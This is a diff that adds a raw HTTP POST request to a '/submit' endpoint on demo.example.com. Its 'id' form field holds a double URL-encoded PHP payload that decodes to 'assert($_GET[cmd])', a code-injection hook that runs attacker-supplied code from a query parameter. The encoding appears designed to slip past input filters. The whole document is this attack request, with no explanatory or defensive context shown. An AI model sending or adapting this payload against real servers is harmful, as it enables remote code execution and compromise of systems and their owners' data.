@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+Connection: close
+
+id=a%253Dassert%2528%2524_GET%255Bcmd%255D%2529
